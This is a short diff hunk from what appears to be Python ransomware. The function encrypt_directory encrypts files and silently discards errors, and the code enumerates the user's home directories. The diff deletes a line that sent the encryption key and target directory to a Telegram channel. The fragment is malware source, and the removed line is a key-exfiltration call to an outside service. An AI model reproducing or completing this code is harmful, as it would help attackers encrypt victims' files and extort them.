@@ -70,7 +70,6 @@ def encrypt_directory(directory, key):
                 future.result()
             except Exception:
                 pass
-    send_telegram_message(f"[!] Encryption completed in {directory}.\nKey: {key.decode()}")
 
 def get_user_directories():
     user_home = os.path.expanduser("~")
